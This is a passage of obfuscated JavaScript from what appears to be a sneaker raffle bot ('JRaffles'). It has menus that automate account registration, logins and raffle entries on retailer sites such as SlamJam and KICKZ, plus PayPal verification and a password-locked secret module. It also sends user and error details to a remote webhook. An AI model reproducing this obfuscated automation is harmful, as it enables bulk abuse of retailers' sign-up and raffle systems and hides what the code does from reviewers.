                                            var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x4f8242 = await _0x3624ea(), _0x20414f = await _0x50f62c();
                                                return await _0x95e080('https://slamjam.nl/account/register', _0x51cce0, _0x20414f, _0x4f8242), _0x303f4f();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x4f8242 = await _0x3624ea(), _0x20414f = await _0x50f62c();
                                                    return await _0x5bd077('', _0x51cce0, _0x20414f, _0x4f8242), _0x303f4f();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x5c60fc[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                                                var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x4f8242 = await _0x3624ea(), _0x4327ab = await _0x50f62c();
                                                    return await _0x2f0d12('https://www.kickz.com/nl/login/', _0x51cce0, _0x4327ab, _0x4f8242), _0x303f4f();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x4f8242 = await _0x3624ea(), _0x4327ab = await _0x50f62c();
                                                        return await _0x3e9e3d(_0x51cce0, _0x4327ab, _0x4f8242), _0x303f4f();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x5c60fc[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                                                    var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x4f8242 = await _0x3624ea(), _0x21133b = await _0x50f62c();
                                                        return await _0x4d3934(_0x51cce0, _0x21133b, _0x4f8242), _0x303f4f();
                                                    }
                                                } else {
                                                    if (_0x5c60fc[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x1b3ea1(0x3e8), _0x303f4f();
                                                    else {
                                                        if (_0x5c60fc[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x10efdf = _0x5c60fc[taskModule]['name'], _0x4f8242 = await _0x3624ea();
                                                            const _0x4862e0 = await _0x8ed0fa();
                                                            var _0x7f3626 = _0x4862e0['split'](';');
                                                            await _0x4db678(_0x7f3626, _0x10efdf, _0x4f8242);
                                                        } else {
                                                            if (_0x5c60fc[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x2db708 = 0x0;
                                                                for (const _0x51d933 in _0xc43b8d) {
                                                                    console['log']('(' + _0x2db708 + ')\x20' + _0x51d933 + '\x20:\x20' + _0xc43b8d[_0x51d933]), _0x2db708++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x2db708 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x5c9d56 = await _0x1b7918();
                                                                if (_0x5c9d56 == _0x2db708)
                                                                    return _0x303f4f();
                                                                console['clear'];
                                                                var _0x22e22d = 0x0;
                                                                for (var _0x15cd88 in _0xc43b8d) {
                                                                    if (_0x5c9d56 == _0x22e22d) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x15cd88 + '\x20:'), _0xc43b8d[_0x15cd88] = await _0x58eb8a(), _0x16016b['writeFileSync']('../settings.json', JSON['stringify'](_0xc43b8d));
                                                                        break;
                                                                    } else
                                                                        _0x22e22d++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x1b3ea1(0xbb8), _0x303f4f();
                                                            } else {
                                                                if (_0x5c60fc[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x36d402(), _0x303f4f();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x5c60fc[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x1bf1b0 = await _0x35af35();
                                                                        _0x1bf1b0 == 'ModuleVoorDeBoys' ? (await _0x2891b8(), await _0x1d2cf1(), await afewFunction(_0x33efec[_0x52cfa1], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x1b3ea1(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x303f4f();
        } catch (_0x43123e) {
            return console['log'](_0x43123e), await _0x1b3ea1(0x3a98);
        }
}
;
_0x2768f8('JRaffles\x20' + _0x44c289), _0x36d402();
try {
    _0x39cf44();
} catch (_0x14ee5f) {
    var _0x5e1d33 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x57b088
            },
            {
                'name': 'Version',
                'value': '' + _0x44c289
            },
            {
                'name': 'Error',
                'value': '' + _0x14ee5f
            }
        ]
    }];
    const _0xe3130d = { 'embeds': _0x5e1d33 };
    _0x57e113(_0x570583, _0xe3130d);
}